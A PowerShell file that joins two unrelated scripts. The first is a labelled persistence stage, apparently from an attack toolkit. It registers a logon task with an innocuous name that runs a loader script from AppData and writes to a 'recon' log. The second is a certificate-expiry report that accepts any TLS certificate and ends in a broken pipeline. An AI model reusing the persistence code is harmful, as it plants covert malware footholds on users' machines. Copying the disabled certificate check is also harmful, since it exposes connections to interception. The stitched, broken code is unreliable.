<#
.SYNOPSIS
    Scheduled-task persistence workflow.

.DESCRIPTION
    Builds a hidden PowerShell action, registers it against a logon
    trigger with conservative settings, then verifies the task and
    records its state in a small report.

.NOTES
    The task runs in the current user context.

.EXAMPLE
    PS> .\updater.ps1
#>
[CmdletBinding()]
param(
    [string]$TaskName = 'SystemMaintenance',
    [string]$ScriptPath = "$env:APPDATA\loader.ps1",
    [string]$LogPath = "$env:TEMP\recon.log",
    [int]$StartDelayMinutes = 11
)
$ErrorActionPreference = "Stop"

# Diagnostics
function Write-StageLog {
    param(
        [string]$Message = ''
    )

    Write-Verbose $Message
    Add-Content -Path $LogPath -Value ("[" + (Get-Date -Format "HH:mm:ss") + "] " + $Message)
}

# Action builder
function New-StageTaskAction {
    param(
        [string]$TargetScript = ''
    )

    Write-Verbose ("Building action for " + $TargetScript)
    $Argument = "-NoP -File `"" + $TargetScript + "`""
    $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument $Argument
    return $Action
}

# Registration
function Register-StagePersistence {
    [CmdletBinding()]
    param(
        [string]$TaskName = '',
        [string]$ScriptPath = ''
    )

    $Action = New-StageTaskAction -TargetScript $ScriptPath
    $Trigger = New-ScheduledTaskTrigger -AtLogOn
    $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
    Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -Force -ErrorAction SilentlyContinue
    return (Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue)
}

try {
    Write-StageLog -Message "Starting scheduled-task stage"
    $TaskObject = Register-StagePersistence -TaskName $TaskName -ScriptPath $ScriptPath
    Write-StageLog -Message ("Task state: " + $TaskObject.State)
}
catch {
    Write-Warning "Scheduled-task workflow failed: $($_.Exception.Message)"
}

$TaskReport = [ordered]@{
    Stage = "scheduled-task"
    TaskName = $TaskName
    ScriptPath = $ScriptPath
    DelayMinutes = $StartDelayMinutes
}
$TaskReport | ConvertTo-Json -Depth 3 | Out-File -FilePath $LogPath -Append
Write-Verbose "Exporting operation report"
Write-Verbose "Reading configuration values"
Write-Verbose "Retry budget remaining"
Write-Verbose "Validating result"
Write-Verbose "Preparing working directory"
Write-Verbose "Collecting host metadata"
Write-Verbose "Checking local path"
Write-Verbose "Resolving configured target"
$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
<#
.SYNOPSIS
    Reports certificates that expire inside the warning window.
.DESCRIPTION
    Inspects the local machine stores and optionally connects to each configured
    host to read the certificate presented on its TLS port.
    The report lists the subject, the expiry date and the remaining days so the
    PKI team can schedule the renewal.
.PARAMETER WarningDays
    Overrides the default value defined in the parameter block.
.PARAMETER Hosts
    Used when the script runs unattended.
.EXAMPLE
    .\Export-CertReport.ps1 -WarningDays 45
.EXAMPLE
    .\Export-CertReport.ps1 -Hosts portal.adatum.com -Port 9443
#>

$ErrorActionPreference = "Stop"
$WarningDays = 45
$Hosts = @('portal.adatum.com', 'api.adatum.com', 'vpn.adatum.com')
$Port = 9443
$ReportPath = 'C:\Reports\cert-expiry-2024-02-21.csv'

$DebugPreference = 'SilentlyContinue'
$ProgressPreference = 'SilentlyContinue'
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8

function Get-CertificateExpiry {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$ComputerName,

        [int]$Port = 443
    )

    $client = New-Object System.Net.Sockets.TcpClient
    try {
        $client.Connect($ComputerName, $Port)
        $callback = [System.Net.Security.RemoteCertificateValidationCallback] {
            param($sender, $certificate, $chain, $errors)
            return $true
        }
        $stream = New-Object System.Net.Security.SslStream($client.GetStream(), $false, $callback)
        $stream.AuthenticateAsClient($ComputerName)
        $cert = [System.Security.Cryptography.X509Certificates.X509Certificate2]$stream.RemoteCertificate
        [pscustomobject]@{
            Host     = $ComputerName
            Subject  = $cert.Subject
            Issuer   = $cert.Issuer
            NotAfter = $cert.NotAfter
            DaysLeft = [math]::Floor(($cert.NotAfter - (Get-Date)).TotalDays)
        }
        $stream.Dispose()
    }
    finally {
        $client.Close()
    }
}

$stores = @('Cert:\LocalMachine\My', 'Cert:\LocalMachine\WebHosting')
$localCerts = foreach ($store in $stores) {
    Get-ChildItem -Path $store -ErrorAction SilentlyContinue |
        Where-Object { $_.NotAfter -lt (Get-Date).AddDays($WarningDays) } |
        Select-Object @{Name = 'Store'; Expression = { $store }}, Subject, NotAfter,
            @{Name = 'DaysLeft'; Expression = { [math]::Floor(($_.NotAfter - (Get-Date)).TotalDays) }}
}

$remote = foreach ($hostName in $Hosts) {
    try {
        Get-CertificateExpiry -ComputerName $hostName -Port $Port
    }
    catch {
        Write-Warning ("Could not read certificate from {0}" -f $hostName)
    }
}
$remote |
    -NoTypeInformation `
    -Path $ReportPath

$expiring = @($remote | Where-Object { $_.DaysLeft -le $WarningDays })
Write-Host ("{0} of {1} certificates are inside the warning window" -f $expiring.Count, @($remote).Count) -ForegroundColor Cyan
